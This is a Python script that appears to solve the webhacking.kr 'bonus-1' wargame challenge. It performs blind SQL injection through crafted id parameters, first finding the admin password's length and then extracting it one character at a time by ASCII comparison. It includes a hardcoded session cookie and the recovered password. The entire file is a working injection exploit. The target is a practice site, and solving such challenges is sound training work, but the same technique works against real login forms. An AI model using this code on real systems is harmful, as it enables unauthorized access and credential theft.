import requests

url = "https://webhacking.kr/challenge/bonus-1/index.php"
length_password = 0
password = ""
cookie = {
	"PHPSESSID": "h8pu9hgfta4fhrj1snkvr2k6co"
}

for i in range(1,50):

	payload = "?id='or id = 'admin' and length(pw) =" + str(i) + "%23&pw=1"

	r = requests.get(url+payload, cookies=cookie)
	if("wrong password" in r.text):
		print('GET LENGTH OF PASSWORD')
		print(i)
		length_password = i
		break
	else:
		print('failed {}'.format(i))

for i in range(1, length_password + 1):
	for j in range(48,128):
		payload = "?id='or id = 'admin' and ascii(substr(pw," + str(i) + ", 1)) =" + str(j) + "%23&pw=1"

		r = requests.get(url+payload, cookies=cookie)
		if("wrong password" in r.text):
			print('GET THE PASSWORD')
			print(chr(j))
			password += chr(j)
			break
		else:
			print('failed {}'.format((chr(j))))

print("password is: " + password)

# password is: there_is_no_rest_for_the_white_angel



